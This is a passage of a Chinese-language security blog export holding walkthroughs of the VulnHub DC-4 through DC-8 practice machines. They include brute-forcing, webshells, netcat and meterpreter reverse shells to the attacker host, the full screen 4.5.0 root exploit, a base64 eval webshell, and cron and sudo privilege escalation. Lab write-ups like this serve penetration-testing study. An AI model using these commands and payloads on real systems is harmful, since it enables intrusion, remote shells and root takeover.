class="line">winner</span><br><span class="line">boomer</span><br><span class="line">lolita</span><br><span class="line">nastya</span><br><span class="line">alexis1</span><br><span class="line">carmen</span><br><span class="line">angelo</span><br><span class="line">nicholas1</span><br><span class="line">portugal</span><br><span class="line">precious</span><br><span class="line">jackass1</span><br><span class="line">jonathan1</span><br><span class="line">yfnfif</span><br><span class="line">bitch</span><br><span class="line">tiffany</span><br><span class="line">rabbit</span><br><span class="line">rainbow1</span><br><span class="line">angel123</span><br><span class="line">popcorn</span><br><span class="line">barbara</span><br><span class="line">brandy</span><br><span class="line">starwars1</span><br><span class="line">barney</span><br><span class="line">natalia</span><br><span class="line">jibril04</span><br><span class="line">hiphop</span><br><span class="line">tiffany1</span><br><span class="line">shorty</span><br><span class="line">poohbear1</span><br><span class="line">simone</span><br><span class="line">albert</span><br><span class="line">marlboro</span><br><span class="line">hardcore</span><br><span class="line">cowboys</span><br><span class="line">sydney</span><br><span class="line">alex</span><br><span class="line">scorpio</span><br><span class="line">1234512345</span><br><span class="line">q12345</span><br><span class="line">qq123456</span><br><span class="line">onelove</span><br><span class="line">bond007</span><br><span class="line">abcdefg1</span><br><span class="line">eagles</span><br><span class="line">crystal1</span><br><span class="line">azertyuiop</span><br><span class="line">winter</span><br><span class="line">sexy12</span><br><span class="line">angelina</span><br><span class="line">james</span><br><span class="line">svetlana</span><br><span class="line">fatima</span><br><span class="line">123456k</span><br><span class="line">icecream</span><br><span class="line">popcorn1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用hydra进行爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P ./dc4.txt  ssh://192.168.168.131</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/8.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：jim</span><br><span class="line">密码：jibril04</span><br></pre></td></tr></table></figure>

<p>用xshll或是kali连接到目标主机<br>看看身份</p>
<p><img src="/2022/04/17/DC-4/9.png" alt="img"></p>
<p>通过上传漏洞探测器，发现没有可用的提权漏洞<br>发现之前存在的一条信息</p>
<p><img src="/2022/04/17/DC-4/10.png" alt="img"></p>
<p>我有一条信息<br>去看看吧</p>
<p><img src="/2022/04/17/DC-4/11.png" alt="img"></p>
<p>这样就知道了charles的密码了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：charles</span><br><span class="line">密码： ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>

<p>登录charles的号看看<br>看了charles可以用sudo了</p>
<p><img src="/2022/04/17/DC-4/12.png" alt="img"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>teehee是一个小的编辑器<br>这里我通过crontab提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo teehee /etc/crontab</span><br><span class="line">* * * * * root <span class="built_in">chmod</span> 4777 /bin/sh  //4777普通用户也能执行</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/14.png" alt="img"></p>
<p>分钟 小时 日期 月 周 用户 命令<br>ctrl+c退出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">cat</span> /root/the-flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/13.png" alt="img"></p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提取</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-5</title>
    <url>/2022/04/17/DC-5/</url>
    <content><![CDATA[<p>渗透环境：DC5 <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/1.png" alt="img"></p>
<p>发现目标主机为192.168.168.133</p>
<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.133</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/2.png" alt="img"></p>
<p>开放了80端口浏览器打开</p>
<p><img src="/2022/04/17/DC-5/3.png" alt="img"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>只看到这个页面有注入的可能，试试<br>然后返回了thankyou.php过来</p>
<p><img src="/2022/04/17/DC-5/4.png" alt="img"></p>
<p>看看有没有存在sql注入，xss注入的可能<br>测试过，没反应<br>最后发现可以文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/5.png" alt="img"></p>
<p>这里用日志注入的方法getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.168.133/&lt;?php @assert($_POST[&#x27;test&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>查看日志文件位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/6.png" alt="img"></p>
<p>查看文件，用蚁剑连接</p>
<p><img src="/2022/04/17/DC-5/8.png" alt="img"></p>
<h3 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.168.128 //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.128 LPORT=4444 -f raw &gt; shell.php //生成shell</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>将shell.php通过蚁剑上传到&#x2F;tmp<br>访问对应shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thankyou.php?file=/tmp/shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/9.png" alt="img"></p>
<p>连接成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/10.png" alt="img"></p>
<p>有个screen-4.5.0看看有没有漏洞可用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br><span class="line"><span class="built_in">cd</span> /usr/share/exploitdb/exploits/linux/local</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/11.png" alt="img"></p>
<p>把第一个文件通过蚁剑上传，看看能不能run<br>结果报错了<br>分析对应sh</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<p>根据上面逻辑得到3段代码，本地编译<br>libhax.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>

<p>rootshell.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>

<p>run.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<p>把run.sh, rootshell, libhax.so上传到&#x2F;tmp文件夹中<br>执行run.sh文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./run.sh</span><br></pre></td></tr></table></figure>

<p>成功提权后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/thisistheflag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/12.png" alt="img"></p>
<p>获得flag，DC-5clear</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6</title>
    <url>/2022/04/22/DC-6/</url>
    <content><![CDATA[<p>渗透环境：DC6 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/22/DC-6/1.png" alt="img"></p>
<p>靶机ip为192.168.168.134</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.134</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/22/DC-6/2.png" alt="img"></p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://wordy/ -e *</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/22/DC-6/4.png" alt="img"></p>
<p>发现wordpress后台</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用wpscan扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy  --enumerate</span><br></pre></td></tr></table></figure>

<p>发现存在的用户</p>
<p><img src="/2022/04/22/DC-6/3.png" alt="img"></p>
<p>使用burp进行爆破，失败<br>在原文下发现提示</p>
<p><img src="/2022/04/22/DC-6/5.png" alt="img"></p>
<p>使用提示中的字典</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>

<p>爆破成功</p>
<p><img src="/2022/04/22/DC-6/6.png" alt="img"></p>
<p>登录后台寻找突破口<br>发现一次存在命令执行的地方<br>在kali开启监听端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>

<p>抓包修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc 192.168.168.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>发送<br>上传木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>蚁剑连接<br>在home下发现线索</p>
<p><img src="/2022/04/22/DC-6/8.png" alt="img"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ssh连接<br>账号：graham<br>密码：GSo7isUM1D4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/22/DC-6/9.png" alt="img"></p>
<p>发现 &#x2F;home&#x2F;jens&#x2F;backups.sh没有密码<br>往里面添上&#x2F;bin&#x2F;bash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>以jens的身份执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>发现当前身份变为jens</p>
<p><img src="/2022/04/22/DC-6/10.png" alt="img"></p>
<p>nmap提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; /tmp/shell</span><br><span class="line">sudo  nmap  --script= /tmp/shell</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/2022/04/22/DC-6/11.png" alt="img"></p>
<p>查看flag</p>
<p><img src="/2022/04/22/DC-6/12.png" alt="img"></p>
<p>DC-6 clear</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-7</title>
    <url>/2022/04/29/DC-7/</url>
    <content><![CDATA[<p>渗透环境DC-7：<a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.135</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.135</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-7/1.png" alt="img"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>目标开启了22，80端口，先是访问80端口<br>cms为drupal<br>这里看到一个登录框</p>
<p><img src="/2022/04/29/DC-7/2.png" alt="img"></p>
<p>对admin进行弱命令爆破，失败<br>主页有这么的一个提示</p>
<p><img src="/2022/04/29/DC-7/3.png" alt="img"></p>
<p>突破口不在当前box中，我是想不到了，后来看别人的wp可算是明白了，原来突破口是这个</p>
<p><img src="/2022/04/29/DC-7/4.png" alt="img"></p>
<p>百度这个内容，可以找到一个github账号</p>
<p><img src="/2022/04/29/DC-7/5.png" alt="img"></p>
<p>看看有什么可用信息，在config.php文件中看到了账号密码</p>
<p><img src="/2022/04/29/DC-7/6.png" alt="img"></p>
<p>这个账号不是后台的，是主机的登录账号和密码，用xshell连接</p>
<p>登录后看到有new mail</p>
<p><img src="/2022/04/29/DC-7/7.png" alt="img"></p>
<p>看看mbox的内容</p>
<p>我们可以看到每隔一段时间，就会由root执行 &#x2F;opt&#x2F;scripts&#x2F;backups.sh</p>
<p><img src="/2022/04/29/DC-7/8.png" alt="img"></p>
<p>看看能不能往那个文件有什么内容，写点东西进去</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>

<h3 id="drush修改密码"><a href="#drush修改密码" class="headerlink" title="drush修改密码"></a>drush修改密码</h3><p><img src="/2022/04/29/DC-7/9.png" alt="img"></p>
<p>这里看到有drush和gpg命令<br>gpg主要是用来进行数字签名的操作<br>drush发现可以修改账号的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-7/10.png" alt="img"></p>
<p>这能是root用户和www-data进行修改<br>显示改后台admin的密码看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">drush user-password admin --password=<span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-7/11.png" alt="img"></p>
<p>后台登录</p>
<p><img src="/2022/04/29/DC-7/12.png" alt="img"></p>
<h3 id="存在可利用插件"><a href="#存在可利用插件" class="headerlink" title="存在可利用插件"></a>存在可利用插件</h3><p>这里可以添加模板，我们添加php模板，这样我们就可以发布php模板的帖子<br>下载地址：<a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
<p><img src="/2022/04/29/DC-7/13.png" alt="img"></p>
<p>安装完后勾选php</p>
<p><img src="/2022/04/29/DC-7/14.png" alt="img"></p>
<p>content-&gt;add content-&gt;basic page<br>写入一句话木马，蚁剑连接</p>
<p><img src="/2022/04/29/DC-7/15.png" alt="img"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>往&#x2F;opt&#x2F;scripts&#x2F;backups.sh写入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.168.128 1111 -e /bin/bash </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-7/16.png" alt="img"></p>
<p>在kali上执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1111</span><br></pre></td></tr></table></figure>

<p>等待一段时间后就会上线了</p>
<p><img src="/2022/04/29/DC-7/17.png" alt="img"></p>
<p>获得flag</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">心得：这次的这个社工操作是真的没想到欸，也算是一次体验吧</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-8</title>
    <url>/2022/04/29/DC-8/</url>
    <content><![CDATA[<p>渗透环境DC-8：<a href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.136</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.136</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/1.png" alt="img"></p>
<p>目标开启了80，22端口<br>访问目标的网页</p>
<p><img src="/2022/04/29/DC-8/2.png" alt="img"></p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>不要对user页面进行爆破，会被ban掉的！！！<br>逛逛有没有什么注入点啥的，<br>发现存在sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.168.136/?nid=3</span><br></pre></td></tr></table></figure>

<p>我们用sqlmap进行一个爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.168.136/?nid=1 --current-db //当前数据库的名称</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -tables -D d7db  //当前数据库的表名</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -columns -T <span class="built_in">users</span> -D d7db  //users表下的列名</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -C <span class="string">&quot;name,pass&quot;</span> -T <span class="built_in">users</span> -D d7db --dump  //users表下的name与pass的内容</span><br></pre></td></tr></table></figure>

<p>这里我们用john进行hash破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john ./hash.txt //hash文件里放我们的hash值</span><br></pre></td></tr></table></figure>

<p>最后发现只有john的密码能出来</p>
<p><img src="/2022/04/29/DC-8/3.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：john</span><br><span class="line">密码：turtle</span><br></pre></td></tr></table></figure>

<p>登录后台，这个有点向DC-7的方式进行<br>我们这里选择进行一个监听<br>这里用的是msf<br>攻击机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp //payload根据实际环境选择</span><br><span class="line"><span class="built_in">set</span> lhost IP //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.136 LPORT=2222 -f raw &gt; shell.php //生成的php，将代码复制到以下图片中，LHOST为攻击机IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/4.png" alt="img"></p>
<p>选择保存<br>再攻击机上run<br>然后在该页面进行请求</p>
<p><img src="/2022/04/29/DC-8/5.png" alt="img"></p>
<p>这是我们的msf就能连接上了</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先是一些常规操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>最后找到了一个exim4的软件</p>
<p><img src="/2022/04/29/DC-8/6.png" alt="img"></p>
<p>查看对应的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/7.png" alt="img"></p>
<p>查是否存在可利用漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit exim 4.8</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/8.png" alt="img"></p>
<p>这里我们将第二个脚本上到目标的&#x2F;tmp目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload ./46996.sh /tmp //上传</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">shell</span><br><span class="line"><span class="built_in">chmod</span> 4777 ./46996.sh</span><br><span class="line">./46996.sh -m netcat //命令来源，源代码有写的，可以看看</span><br></pre></td></tr></table></figure>

<p>执行完后我们就是root了</p>
<p><img src="/2022/04/29/DC-8/9.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/10.png" alt="img"></p>
<p>DC-8 clear</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB常见漏洞</title>
    <url>/2022/07/14/WEBvul/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="0767d2eb9911ff507a82b475ed3eff17673b41e3fe2f7f2c7c2eed72099cf7cd">5ba8862fa6c95c401a06bb55180564c9286cc7100acfb9b1b2e1f91e3e7aa4bb330fe2535a40b136bf9d63a98dbaa9bfc7c5a6fdf474e42c01a52d310911c3e1a3886e774b014a3263feb5034438735d232c2bed726d951517f137bc26e3e79752527e2fe031846c6be9d5d72cc9316b9b79ff98cb0edeb67fda2164d828f5b7a1f1606090b934ae5ced61364cd7116cefa65128387466edefd66b85963c48adb1a633ff570d4429c68cbfd28e9e1ac942180c45ec57e47f6a15837bd4d5f349b73c6272c2cc3c4f3dde2aa550886945d4f2f8587caaeaab88a000ab5153afbe027fb28d9cae10b2aa098604421ef3e5ec789fc7873aedd4b2fdbd56d6f49e6ec523557f30af9513aaf01cff1b1036be9c07b9c38f6b7759a59752f3aa071cd47d312c0aea2aac42ff74888ecf7b29b1fc9f4da4aa1ed700a8cc2d7d1ad393affbd599095b0c43a43765b8f81a2cc2e85a952f49e19cc21a8a49fd3ae7c966ea2c9d8916b5310312b9ab927e1aad94298a616ed39b3685568e51338d942edac05053f8e792cdd5d83d07f0ab9d4e7f8dacee381c5e3b06c1419fd09abadc131dda2dcf457d63332b2c05b9146627148bade313e8d683bcba0d755fd076e01bfccbcec764d5166cf620f79d5255ecb6489107b8618bd17eecad1ce071abaec050d7c0323617f5669682d49c7c67c28025901f345f3a75d8cbf47dd18d1fccce92ada34a4a4548df9b39040516b034e1d86c443f50d4fe06f842d82cc91b8f4d0ebb3ceb1a22b30657f5d09524429e4fb750eb9d3214e5d4162a985302e72df3078ed06a3bf33cce30b90d34a71108660521fa895ac60045432eb8a693673f5592896c270f7fcacf20c25b4fd3ceb0d1b158e06a86f4c89f2ff31499f2976a6a7